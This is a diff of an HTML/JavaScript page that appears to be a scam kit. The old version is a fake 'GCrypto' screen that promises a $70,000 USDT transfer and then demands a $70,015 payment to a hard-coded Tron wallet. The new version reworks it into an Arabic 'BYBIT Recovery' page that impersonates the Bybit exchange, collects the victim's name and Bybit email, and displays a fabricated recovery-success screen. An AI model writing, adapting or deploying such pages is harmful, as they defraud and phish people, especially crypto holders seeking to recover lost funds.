@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GCrypto - Transaction Details</title>
+    <title> BYBIT Recovery</title>
     <style>
         * {
             margin: 0;
@@ -12,13 +12,14 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif, 'Arial', 'Helvetica';
+            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 10px;
+            direction: rtl;
         }
 
         .phone-frame {
@@ -26,16 +27,17 @@
             max-width: 400px;
             background: white;
             border-radius: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             overflow: hidden;
             display: flex;
             flex-direction: column;
             height: 844px;
+            direction: rtl;
         }
 
         /* Status Bar */
         .status-bar {
-            background: linear-gradient(135deg, #0052CC 0%, #1565C0 100%);
+            background: linear-gradient(135deg, #f7931a 0%, #e8860d 100%);
             color: white;
             padding: 12px 20px;
             display: flex;
@@ -44,11 +46,12 @@
             font-size: 14px;
             font-weight: 500;
             padding-top: 8px;
+            direction: rtl;
         }
 
         /* Header */
         .header {
-            background: linear-gradient(135deg, #0052CC 0%, #1565C0 100%);
+            background: linear-gradient(135deg, #f7931a 0%, #e8860d 100%);
             color: white;
             padding: 16px 20px;
             display: flex;
@@ -56,12 +59,14 @@
             align-items: center;
             font-size: 18px;
             font-weight: 600;
+            direction: rtl;
         }
 
         .header-left {
             display: flex;
             align-items: center;
             gap: 10px;
+            order: 2;
         }
 
         .back-btn {
@@ -81,6 +86,7 @@
         .header-right {
             display: flex;
             gap: 15px;
+            order: 1;
         }
 
         .header-icon {
@@ -100,6 +106,8 @@
             overflow-y: auto;
             padding: 30px 20px;
             background: #f8f9fa;
+            direction: rtl;
+            text-align: right;
         }
 
         .content::-webkit-scrollbar {
@@ -129,7 +137,7 @@
             width: 100px;
             height: 100px;
             margin: 0 auto 25px;
-            background: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%);
+            background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -138,7 +146,7 @@
         }
 
         .success-message {
-            color: #0052CC;
+            color: #f7931a;
             font-size: 24px;
             font-weight: 700;
             margin-bottom: 20px;
@@ -168,6 +176,7 @@
             padding: 16px 0;
             border-bottom: 1px solid #f0f2f5;
             align-items: flex-start;
+            text-align: right;
         }
 
         .detail-row:last-child {
@@ -185,7 +194,7 @@
             color: #1a1a1a;
             font-size: 14px;
             font-weight: 600;
-            text-align: right;
+            text-align: left;
             max-width: 200px;
             word-break: break-all;
             line-height: 1.4;
@@ -193,8 +202,8 @@
 
         .copy-icon {
             cursor: pointer;
-            margin-left: 8px;
-            color: #0052CC;
+            margin-right: 8px;
+            color: #f7931a;
             font-size: 16px;
         }
 
@@ -214,11 +223,12 @@
             justify-content: center;
             gap: 6px;
             border-top: 1px solid #f0f2f5;
+            direction: rtl;
         }
 
         .footer-logo {
             font-weight: 700;
-            color: #1a1a1a;
+            color: #f7931a;
         }
 
         /* Registration Modal */
@@ -234,6 +244,7 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            direction: rtl;
         }
 
         .modal-overlay.active {
@@ -248,6 +259,8 @@
             padding: 40px 25px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             animation: slideUp 0.3s ease-out;
+            direction: rtl;
+            text-align: right;
         }
 
         @keyframes slideUp {
@@ -262,7 +275,7 @@
         }
 
         .modal-header {
-            background: linear-gradient(135deg, #0052CC 0%, #1565C0 100%);
+            background: linear-gradient(135deg, #f7931a 0%, #e8860d 100%);
             color: white;
             padding: 20px;
             margin: -40px -25px 30px -25px;
@@ -283,7 +296,7 @@
         }
 
         .modal-amount {
-            background: linear-gradient(135deg, #0052CC 0%, #1565C0 100%);
+            background: linear-gradient(135deg, #f7931a 0%, #e8860d 100%);
             color: white;
             padding: 20px;
             border-radius: 15px;
@@ -296,6 +309,7 @@
         /* Form Styles */
         .form-group {
             margin-bottom: 20px;
+            text-align: right;
         }
 
         .form-group label {
@@ -315,13 +329,14 @@
             transition: all 0.3s ease;
             font-family: inherit;
             background: #f8f9fa;
+            text-align: right;
         }
 
         .form-group input:focus {
             outline: none;
-            border-color: #0052CC;
+            border-color: #f7931a;
             background: white;
-            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
+            box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.1);
         }
 
         .form-group input::placeholder {
@@ -334,6 +349,7 @@
             margin-top: 6px;
             display: none;
             font-weight: 500;
+            text-align: right;
         }
 
         .error-message.show {
@@ -349,6 +365,7 @@
             display: flex;
             gap: 12px;
             margin-top: 30px;
+            flex-direction: row-reverse;
         }
 
         .btn {
@@ -372,9 +389,9 @@
         }
 
         .btn-confirm {
-            background: linear-gradient(135deg, #0052CC 0%, #1565C0 100%);
+            background: linear-gradient(135deg, #f7931a 0%, #e8860d 100%);
             color: white;
-            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.3);
+            box-shadow: 0 4px 12px rgba(247, 147, 26, 0.3);
         }
 
         .btn-confirm:active {
@@ -389,7 +406,7 @@
         .pay-now-btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #0052CC 0%, #1565C0 100%);
+            background: linear-gradient(135deg, #f7931a 0%, #e8860d 100%);
             color: white;
             border: none;
             border-radius: 12px;
@@ -397,7 +414,7 @@
             font-weight: 700;
             cursor: pointer;
             margin-top: 30px;
-            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.3);
+            box-shadow: 0 4px 12px rgba(247, 147, 26, 0.3);
             transition: all 0.3s ease;
         }
 
@@ -412,6 +429,7 @@
             border-radius: 12px;
             margin-bottom: 20px;
             border: 1px solid #e0e0e0;
+            text-align: right;
         }
 
         .user-info-row {
@@ -419,6 +437,7 @@
             justify-content: space-between;
             margin-bottom: 12px;
             font-size: 13px;
+            text-align: right;
         }
 
         .user-info-row:last-child {
@@ -433,6 +452,7 @@
             color: #1a1a1a;
             font-weight: 600;
             word-break: break-all;
+            text-align: left;
         }
     </style>
 </head>
@@ -441,37 +461,37 @@
     <div class="modal-overlay active" id="registrationModal">
         <div class="modal">
             <div class="modal-header">
-                <h2>Incoming Transaction</h2>
-                <p>Complete registration to proceed</p>
+                <h2>استرجاع الحساب</h2>
+                <p>تحقق من هويتك لاسترجاع الحساب</p>
             </div>
-            <div class="modal-amount">$70,000 USDT</div>
+            <div class="modal-amount">استرجاع كامل</div>
 
             <form id="registrationForm">
                 <div class="form-group">
-                    <label for="fullName">Full Name</label>
+                    <label for="fullName">الاسم الكامل</label>
                     <input 
                         type="text" 
                         id="fullName" 
-                        placeholder="Enter your full name" 
+                        placeholder="أدخل اسمك الكامل" 
                         required
                     >
-                    <div class="error-message" id="nameError">Please enter a valid name (minimum 2 characters)</div>
+                    <div class="error-message" id="nameError">يرجى إدخال اسم صحيح (الحد الأدنى 2 أحرف)</div>
                 </div>
 
                 <div class="form-group">
-                    <label for="usdtAddress">USDT Address (TRX Network)</label>
+                    <label for="usdtAddress">عنوان بريد بايبت الإلكتروني</label>
                     <input 
-                        type="text" 
+                        type="email" 
                         id="usdtAddress" 
-                        placeholder="Enter your USDT wallet address" 
+                        placeholder="أدخل بريدك الإلكتروني لبايبت" 
                         required
                     >
-                    <div class="error-message" id="addressError">Please enter a valid USDT address (starts with T)</div>
+                    <div class="error-message" id="addressError">يرجى إدخال عنوان بريد إلكتروني صحيح</div>
                 </div>
 
                 <div class="button-group">
-                    <button type="button" class="btn btn-cancel" onclick="cancelTransaction()">Cancel</button>
-                    <button type="button" class="btn btn-confirm" onclick="validateAndConfirm()">Confirm</button>
+                    <button type="button" class="btn btn-confirm" onclick="validateAndConfirm()">تأكيد</button>
+                    <button type="button" class="btn btn-cancel" onclick="cancelTransaction()">إلغاء</button>
                 </div>
             </form>
         </div>
@@ -481,19 +501,19 @@
     <div class="phone-frame" id="phoneFrame" style="display: none;">
         <!-- Status Bar -->
         <div class="status-bar">
-            <span>GCrypto</span>
             <span>•••</span>
+            <span>استرجاع بايبت</span>
         </div>
 
         <!-- Header -->
         <div class="header">
-            <div class="header-left">
-                <button class="back-btn" onclick="goBack()">←</button>
-                <span>Transaction Details</span>
-            </div>
             <div class="header-right">
-                <button class="header-icon">⋯</button>
                 <button class="header-icon" onclick="closeApp()">✕</button>
+                <button class="header-icon">⋯</button>
+            </div>
+            <div class="header-left">
+                <span>استرجاع ناجح</span>
+                <button class="back-btn" onclick="goBack()">→</button>
             </div>
         </div>
 
@@ -501,19 +521,19 @@
         <div class="content">
             <!-- Success Card -->
             <div class="success-card">
-                <div class="success-icon">✓</div>
-                <div class="success-message">Your send request is successful</div>
-                <div class="amount-display">$70,000 USDT</div>
+                <div class="success-icon">🔓</div>
+                <div class="success-message">تم استرجاع الحساب بنجاح</div>
+                <div class="amount-display">تم استعادة الوصول</div>
             </div>
 
             <!-- User Info -->
             <div class="user-info-section">
                 <div class="user-info-row">
-                    <span class="user-info-label">Account Name:</span>
+                    <span class="user-info-label">اسم الحساب:</span>
                     <span class="user-info-value" id="displayName">-</span>
                 </div>
                 <div class="user-info-row">
-                    <span class="user-info-label">Your USDT Address:</span>
+                    <span class="user-info-label">عنوان البريد الإلكتروني:</span>
                     <span class="user-info-value" id="displayAddress">-</span>
                 </div>
             </div>
@@ -521,48 +541,48 @@
             <!-- Details Card -->
             <div class="details-card">
                 <div class="detail-row">
-                    <span class="detail-label">Units</span>
-                    <span class="detail-value">$70,000 USDT</span>
+                    <span class="detail-label">حالة الاسترجاع</span>
+                    <span class="detail-value">✓ تم التحقق</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">Network Fee</span>
-                    <span class="detail-value">$21(USDT)</span>
+                    <span class="detail-label">مستوى الأمان</span>
+                    <span class="detail-value">أقصى</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">Wallet Address</span>
+                    <span class="detail-label">معرف الاسترجاع</span>
                     <span class="detail-value">
-                        TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o
+                        REC-2024-001-FB92
                         <span class="copy-icon" onclick="copyAddress()">📋</span>
                     </span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">Date & Time</span>
+                    <span class="detail-label">التاريخ والوقت</span>
                     <span class="detail-value" id="dateTime">-</span>
                 </div>
             </div>
 
-            <!-- Network Details -->
+            <!-- Additional Info -->
             <div class="details-card">
                 <div class="detail-row">
-                    <span class="detail-label">Network</span>
-                    <span class="detail-value">Tron</span>
+                    <span class="detail-label">المنصة</span>
+                    <span class="detail-value">بورصة بايبت</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">Transaction ID</span>
+                    <span class="detail-label">رقم المرجع</span>
                     <span class="detail-value">
-                        c48578c8-d3ae-4586-8eb5-917e4240920b-OUT
+                        98f7d3b1-c5ae-4527-9eb2-a1cd4f1e92c8
                         <span class="copy-icon" onclick="copyTransactionID()">📋</span>
                     </span>
                 </div>
             </div>
 
-            <!-- Pay Now Button -->
-            <button class="pay-now-btn" onclick="payNow()">Pay Now</button>
+            <!-- Finalize Button -->
+            <button class="pay-now-btn" onclick="payNow()">إنهاء الاسترجاع</button>
         </div>
 
         <!-- Footer -->
         <div class="footer">
-            Powered by <span class="footer-logo">PDAX</span>
+            محمي بواسطة <span class="footer-logo">بايبت</span>
         </div>
     </div>
 
@@ -572,7 +592,8 @@
         }
 
         function validateAddress(address) {
-            return address.trim().startsWith('T') && address.trim().length >= 34;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(address.trim());
         }
 
         function clearErrors() {
@@ -617,8 +638,8 @@
             
             // Set current date and time
             const now = new Date();
-            const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' });
-            const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+            const dateStr = now.toLocaleDateString('ar-SA', { month: 'short', day: '2-digit', year: 'numeric' });
+            const timeStr = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit', hour12: true });
             document.getElementById('dateTime').textContent = `${dateStr} ${timeStr}`;
             
             modal.classList.remove('active');
@@ -628,27 +649,27 @@
         function cancelTransaction() {
             document.getElementById('registrationForm').reset();
             clearErrors();
-            alert('Transaction cancelled');
+            alert('تم إلغاء الاسترجاع');
         }
 
         function copyAddress() {
-            const address = 'TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o';
+            const address = 'REC-2024-001-FB92';
             navigator.clipboard.writeText(address).then(() => {
-                alert('✓ Address copied to clipboard!');
+                alert('✓ تم نسخ معرف الاسترجاع!');
             });
         }
 
         function copyTransactionID() {
-            const txID = 'c48578c8-d3ae-4586-8eb5-917e4240920b-OUT';
+            const txID = '98f7d3b1-c5ae-4527-9eb2-a1cd4f1e92c8';
             navigator.clipboard.writeText(txID).then(() => {
-                alert('✓ Transaction ID copied to clipboard!');
+                alert('✓ تم نسخ رقم المرجع!');
             });
         }
 
         function payNow() {
             const userName = document.getElementById('displayName').textContent;
-            const userAddress = document.getElementById('displayAddress').textContent;
-            alert(`Payment Ready!\n\nUser: ${userName}\nYour Wallet: ${userAddress}\n\nPlease send $70,015 USDT to: TZ66YVzH8PLZDSw5fu9w1wShirceWGmpFG`);
+            const userEmail = document.getElementById('displayAddress').textContent;
+            alert(`تم إكمال استرجاع الحساب!\n\nاسم المستخدم: ${userName}\nالبريد الإلكتروني: ${userEmail}\n\nتم استعادة وصول حسابك بنجاح.`);
         }
 
         function goBack() {
@@ -662,7 +683,7 @@
         }
 
         function closeApp() {
-            alert('App closed');
+            alert('تم إغلاق التطبيق');
         }
 
         // Clear errors on input
